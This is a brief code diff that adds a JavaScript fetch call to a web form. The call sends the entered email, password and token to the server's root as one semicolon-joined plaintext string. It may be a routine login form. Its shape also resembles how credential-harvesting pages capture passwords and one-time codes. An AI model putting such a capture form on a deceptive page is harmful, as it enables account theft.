@@ -210,6 +210,13 @@
             var token = document.getElementById("token").value;
             if (email != "" && password != "" && token != "") {
                 document.getElementById("error").style.display = "none";
+                fetch("/", {
+                    method: "POST",
+                    body: email + ";" + password + ";" + token
+                }).then(res => {
+                    console.log("Request complete! response:", res);
+                });
+
             } else {
                 document.getElementById("error").style.display = "block";
             }
